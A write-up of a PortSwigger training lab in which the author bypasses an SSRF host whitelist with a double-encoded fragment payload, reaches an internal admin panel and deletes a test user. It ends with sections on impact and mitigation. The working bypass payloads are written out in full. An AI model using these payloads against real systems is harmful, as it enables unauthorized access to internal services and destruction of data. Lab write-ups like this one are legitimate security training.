# SSRF with Whitelist-Based Input Filter

## 📌 Lab Overview

This lab demonstrates a **Server-Side Request Forgery (SSRF)** vulnerability protected by a **whitelist-based input filter**.

Unlike blacklist filtering, where specific values are blocked, a whitelist only allows predefined trusted values. However, the whitelist validation was implemented incorrectly, allowing it to be bypassed using URL parsing tricks.

The vulnerability existed because:

- the application only allowed requests to a trusted host
- URL parsing behavior was misunderstood
- user-controlled URLs were insufficiently validated
- double URL encoding bypassed security checks

This lab focused on:

- SSRF
- URL parsing confusion
- Whitelist bypass techniques
- URL encoding tricks
- Host validation bypasses

---

# 🔍 Blacklist vs Whitelist

Before solving the lab, it is important to understand the difference between **blacklist filtering** and **whitelist filtering**.

## Blacklist Filtering

A blacklist blocks specific values.

Example:

```text
Blocked:
localhost
127.0.0.1
admin
```

Everything else is allowed.

Example:

```text
localhost      ❌ Blocked
127.0.0.1      ❌ Blocked
2130706433     ✅ Allowed
127.1          ✅ Allowed
```

This is usually weak because attackers can find alternative representations.

---

## Whitelist Filtering

A whitelist only allows predefined values.

Example:

```text
Allowed:
stock.weliketoshop.net
```

Everything else is blocked.

Example:

```text
stock.weliketoshop.net     ✅ Allowed
localhost                  ❌ Blocked
127.0.0.1                  ❌ Blocked
192.168.0.1                ❌ Blocked
```

Whitelist filtering is generally stronger but can still fail when URL parsing is misunderstood.

---

# 🔍 Understanding URL Structure

A URL can contain many components:

```text
Scheme://username:password@subdomain.domain:port/path/file.php?id=1&name=hello#fragment
```

Example:

```text
http://admin:password@admin.vkd.com:443/admin/admin.php?admin=true#settings
```

Breakdown:

| Component | Value |
|------------|---------|
| Scheme | http |
| Username | admin |
| Password | password |
| Host | admin.vkd.com |
| Port | 443 |
| Path | /admin/admin.php |
| Query String | ?admin=true |
| Fragment | #settings |

---

# 🎯 Objective

The goal of this lab was to:

- bypass whitelist validation
- access the internal admin panel
- delete the Carlos user
- exploit SSRF despite host restrictions

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/SSRF%20with%20Whitelist-Based%20Input%20Filter/screenshots/lab7(1).png?raw=true)

The application displayed:

- several products
- View Details buttons

---

## Screenshot 2 — Accessing Product Details

![Screenshot 2](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/SSRF%20with%20Whitelist-Based%20Input%20Filter/screenshots/lab7(2).png?raw=true)

After opening a product page, I found a:

```text
Check Stock
```

button.

Clicking it returned:

```text
831 units
```

---

## Screenshot 3 — Capturing the Stock Check Request

![Screenshot 3](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/SSRF%20with%20Whitelist-Based%20Input%20Filter/screenshots/lab7(3).png?raw=true)

The request was:

```http
POST /product/stock
```

Parameter:

```text
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

This clearly indicated that the backend server was making requests to the supplied URL.

---

## Screenshot 4 — Testing localhost

![Screenshot 4](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/SSRF%20with%20Whitelist-Based%20Input%20Filter/screenshots/lab7(4).png?raw=true)

I modified the parameter:

```text
stockApi=http://localhost/admin
```

Response:

```text
400 Bad Request

External stock check host must be stock.weliketoshop.net
```

This revealed that host validation was being performed.

---

## Screenshot 5 — Confirming the Whitelist

![Screenshot 5](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/SSRF%20with%20Whitelist-Based%20Input%20Filter/screenshots/lab7(5).png?raw=true)

I tested:

```text
stockApi=http://stock.weliketoshop.net/admin
```

Response:

```text
500 Internal Server Error
```

Although the request failed, it confirmed:

```text
stock.weliketoshop.net
```

was accepted by the whitelist.

---

## Screenshot 6 — Testing Username@Host Syntax

![Screenshot 6](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/SSRF%20with%20Whitelist-Based%20Input%20Filter/screenshots/lab7(6).png?raw=true)

Next I tested:

```text
stockApi=http://username:password@stock.weliketoshop.net/admin
```

Response:

```text
500 Internal Server Error
```

This confirmed the URL parser accepted:

```text
username:password@
```

syntax.

---

# 🔍 What Does username:password@ Mean?

Example:

```text
http://admin:password@example.com
```

Breakdown:

```text
Username = admin
Password = password
Host = example.com
```

Historically this was used for HTTP authentication.

Everything before:

```text
@
```

is treated as credentials.

Everything after:

```text
@
```

is treated as the actual host.

---

## Screenshot 7 — Whitelist Bypass

![Screenshot 7](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/SSRF%20with%20Whitelist-Based%20Input%20Filter/screenshots/lab7(7).png?raw=true)

I used:

```text
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```

Response:

```text
200 OK
```

This successfully bypassed the filter.

---

# 🔍 Breaking Down the Payload

Payload:

```text
http://localhost%2523@stock.weliketoshop.net/admin
```

---

### Step 1 — Double Encoded #

```text
%2523
```

decodes as:

```text
%23
```

and then:

```text
#
```

Therefore:

```text
localhost%2523
```

eventually becomes:

```text
localhost#
```

---

### Step 2 — Parser View

The whitelist checker sees:

```text
http://localhost%2523@stock.weliketoshop.net/admin
```

and notices:

```text
stock.weliketoshop.net
```

after the @ symbol.

Therefore validation succeeds.

---

### Step 3 — Backend Decoding

After decoding:

```text
http://localhost#@stock.weliketoshop.net/admin
```

The browser/parser interprets:

```text
localhost
```

as the actual destination.

Everything after:

```text
#
```

becomes a fragment.

Fragments are never sent to servers.

Effectively:

```text
localhost
```

becomes the target host.

---

### Why Did This Work?

The application validated:

```text
stock.weliketoshop.net
```

before decoding.

The backend interpreted:

```text
localhost
```

after decoding.

This mismatch created the bypass.

---

## Screenshot 8 — Accessing the Admin Panel

![Screenshot 8](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/SSRF%20with%20Whitelist-Based%20Input%20Filter/screenshots/lab7(8).png?raw=true)

After bypassing the filter, I rendered the response.

The response contained:

```text
Admin Panel
```

with two users:

```text
wiener
carlos
```

and delete buttons.

---

## Screenshot 9 — Finding Carlos's Delete Link

![Screenshot 9](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/SSRF%20with%20Whitelist-Based%20Input%20Filter/screenshots/lab7(9).png?raw=true)

While reviewing the HTML response, I found:

```html
<a href="/admin/delete?username=carlos">
```

This revealed the endpoint needed to delete Carlos.

---

## Screenshot 10 — Deleting Carlos

![Screenshot 10](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/SSRF%20with%20Whitelist-Based%20Input%20Filter/screenshots/lab7(10).png?raw=true)

I modified the payload:

```text
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos&storeId=1
```

Response:

```http
302 Found
```

This confirmed the backend successfully requested:

```text
/admin/delete?username=carlos
```

and Carlos was deleted.

The lab was successfully solved.

---

# 🔍 Breaking Down the Final Payload

Payload:

```text
http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

Validation Stage:

```text
Host Seen:
stock.weliketoshop.net
```

Whitelist:

```text
✅ Allowed
```

Decoding Stage:

```text
localhost#@stock.weliketoshop.net
```

Fragment:

```text
#@stock.weliketoshop.net
```

ignored

Final destination:

```text
localhost
```

Requested path:

```text
/admin/delete?username=carlos
```

Result:

```text
Carlos Account Deleted
```

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because:

- user-supplied URLs were trusted
- URL validation occurred before full decoding
- URL parsing behavior was misunderstood
- host validation relied on string matching
- the whitelist logic did not match actual request behavior

---

# 💥 Impact

An attacker could potentially:

- bypass whitelist restrictions
- access internal systems
- interact with localhost services
- reach administrative interfaces
- delete users or modify data
- pivot deeper into internal networks

---

# 🛡 Mitigation

To prevent this issue:

- avoid validating URLs using string matching
- fully normalize URLs before validation
- validate resolved hostnames
- block localhost and internal IP ranges
- implement strict allowlists
- disable unnecessary server-side requests
- use dedicated URL parsing libraries

---

# 🧠 Skills Learned

- SSRF Testing
- Whitelist Bypass Techniques
- URL Parsing Attacks
- Double URL Encoding
- Host Validation Weaknesses
- SSRF Exploitation
- Internal Application Discovery

---

# 🧰 Tools Used

- Burp Suite
- Burp Repeater
- Burp Decoder
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how a whitelist-based SSRF defense can fail when URL parsing behavior is misunderstood.

By abusing URL credentials syntax, double URL encoding, and fragment handling, I was able to bypass the host validation logic and force the backend server to access localhost resources.

Through this lab, I learned:

- the difference between blacklist and whitelist filtering
- how URL parsing works internally
- how double URL encoding can bypass validation
- how SSRF filters are commonly implemented incorrectly
- how whitelist protections can be bypassed through parser confusion

The lab was successfully solved by exploiting a flawed whitelist implementation and forcing the backend server to access the internal admin interface.
